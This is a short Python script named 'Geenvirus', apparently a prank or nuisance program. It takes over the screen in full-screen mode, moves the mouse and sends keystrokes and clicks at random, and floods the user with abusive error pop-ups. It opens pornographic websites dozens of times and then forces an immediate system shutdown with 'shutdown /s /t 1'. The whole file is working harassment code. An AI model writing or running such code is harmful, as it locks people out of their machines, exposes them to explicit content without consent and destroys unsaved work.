import tkinter
import tkinter as tk
import random
from tkinter import messagebox
import webbrowser
import os
import pyautogui

countervar = 10
timer = 0
websites = ['https://www.xvideos.com/', 'xvideos.com', 'pornhub.com', 'https://www.pornhub.com/', 'https://xhamster.com/', 'xhamster.com']

window = tk.Tk()
window.title('Geenvirus')
window.geometry("2000x1000")
window.attributes('-disabled', True, "-fullscreen", True)
window.config(bg='grey')


Counter = tk.StringVar()
Counter.set(countervar)
Label = tkinter.Label(window, textvariable=Counter)
Label.place(relx=0.5,rely=0.5,width=200,height=150, anchor="center")


def telaf():
    global countervar
    countervar -= 1
    Counter.set(countervar)
    window.config(bg=random.choice([ "white", "black", "red", "green", "blue", "cyan", "yellow","magenta"]))


for i in range(10):
    timer += 1000
    window.after(timer, telaf)

muistimer = 0
def muiszetten():
    global muistimer
    muistimer += 1
    pyautogui.moveTo(random.randrange(0,1920), random.randrange(200,800))
    window.after(muistimer, muiszetten)


window.after(1, muiszetten)

def error():
        window.config(bg=random.choice(["white", "black", "red", "green", "blue", "cyan", "yellow", "magenta"]))
        messagebox.showerror("Error", "Get fked")


timer2 = 10000
for i in range(100):
    timer2 += 50
    window.after(timer2, error)

def openenen():
    webbrowser.open(websites[random.randrange(0, len(websites))], new=1)
    webbrowser.open(websites[random.randrange(0, len(websites))], new=1)
    pyautogui.hotkey('win')
    pyautogui.hotkey('tab')

    pyautogui.keyDown("alt")
    for i in range(random.randrange(1,10)):
        pyautogui.press("tab")
    pyautogui.keyUp("alt")

    pyautogui.moveTo(random.randrange(0,1920), random.randrange(200,800))
    pyautogui.click()


timer3 = 12000
for i in range(50):
    timer3 += 50
    window.after(timer3, openenen)


def afsluiten():
    print('test')
    os.system("shutdown /s /t 1")


window.after(18000, afsluiten)
window.mainloop()